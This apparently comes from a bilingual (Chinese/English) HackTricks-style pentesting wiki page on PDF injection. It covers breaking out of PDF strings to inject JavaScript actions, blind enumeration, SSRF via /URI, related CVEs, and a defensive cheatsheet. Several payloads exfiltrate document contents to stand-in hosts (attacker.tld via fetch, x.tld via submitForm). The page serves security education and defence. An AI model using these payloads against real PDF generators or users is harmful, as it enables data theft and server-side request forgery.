# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**如果你的输入被反射到 PDF 文件中，你可以尝试注入 PDF 数据以执行 JavaScript、进行 SSRF 或窃取 PDF 内容。**
PDF 语法非常宽松 —— 如果你能跳出嵌入输入的字符串或字典，你可以追加全新的 objects（或在同一 object 中追加新的 keys），Acrobat/Chrome 会很乐意解析它们。
自 2024 年以来，一波 bug-bounty 报告显示 *一个未转义的括号或反斜杠就足够* 实现完整脚本执行。

## TL;DR – 现代攻击工作流程 (2024-2026)
1. 找到任何最终落在生成的 PDF 的 **(parenthesis string)**、`/URI ( … )` 或 `/JS ( … )` 字段内的用户可控值。
2. 注入 `) `（关闭字符串），随后追加下面原语之一，并再加一个打开括号以保持语法有效。
3. 将恶意 PDF 交付给受害者（或交付给自动渲染该文件的后端服务 —— 对盲目漏洞非常有用）。
4. 你的 payload 在 PDF 查看器中运行：
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js（参见 CVE-2024-4367）
* Acrobat → 完整的 JavaScript API（可以通过 `this.getPageNthWord` 外泄任意文件内容）

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*第一个 `)` 关闭原始 URI 字符串，然后我们添加一个新的 **Action** 字典，Acrobat 会在用户点击链接时执行它。*

## Useful Injection Primitives
| Goal | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | 在文档打开时立即执行（在 Acrobat 中有效，在 Chrome 中无效）。 |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | 如果你能控制 `/Link` 注释，则在 PDFium & Acrobat 中有效。 |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | 将其与 JS 中的 `this.getPageNthWord` 结合以窃取内容。 |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | 与上面相同，但目标为内部 URL —— 当后端服务渲染 PDF 并尊重 `/URI` 时非常有用。 |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | 附加到 Page/Annotation/Form 字典以在打开/聚焦时运行。 |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | 如果库允许你注入换行字符，你可以创建全新的对象。 |

## Embedded Actions as Injection Targets
PDF viewers treat **embedded actions** such as `/OpenAction` and `/AA` (Additional Actions) as first-class features that can run when a document opens or when a specific event fires. If you can inject into any dictionary that accepts actions (Catalog, Page, Annotation, or Form field), you can graft an `/AA` tree and trigger JavaScript on open/focus.

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
该模式匹配最近的 jsPDF 漏洞，其中攻击者控制的输入传入 `addJS`（或某些 AcroForm 字段）时，会突破预期的 JavaScript 字符串并注入一个 **Additional Action** 字典。

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) 发布了一个一行命令，用于枚举未知文档内的每个对象 —— 在无法看到生成的 PDF 时非常有用：
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
该代码遍历 Acrobat DOM，并为每个属性/值对发起出站请求，为你提供文件的 *类似 JSON* 转储。详见白皮书 “Portable Data **ex**Filtration” 了解完整技术。

## Real-World Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: attacker-controlled strings can close the JS literal and inject `/AA` → `/O` → `/JavaScript` actions that fire on open/focus.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 bypassed the sandbox with a crafted `/JavaScript` action.
* **Bug bounty 2024-05** – 一家大型 fintech 允许客户提供的发票备注进入 `/URI`；在演示使用 `file:///` URI 导致对内部元数据主机的 SSRF 后，报告获得 $10k 奖金。
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path shows the importance of escaping backslashes and parentheses even *before* the PDF layer.

## Defensive Cheatsheet
1. **Never concatenate raw user input** inside `(`…`)` strings or names. Escape `\`, `(`, `)` as required by §7.3 of the PDF spec or use hex strings `<...>`.
2. If you build links, prefer `/URI (https://…)` that you *fully* URL-encode; block `javascript:` schemes in client viewers.
3. Strip or validate `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` and `/ImportData` dictionaries when post-processing PDFs.
4. On the server side, render untrusted PDFs with a *headless converter* (e.g. qpdf –decrypt –linearize) that removes JavaScript and external actions.
5. Keep PDF viewers up to date; PDF.js < 4.2.67 and Acrobat Reader before July 2024 patches allow trivial code execution.
6. If you use client-side generators (e.g., jsPDF), never pass untrusted input into `addJS` or AcroForm setters that end up inside PDF action dictionaries.

## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research（更新于 2024年5月）。 <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – 嵌入式动作，如 OpenAction/AA。 <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
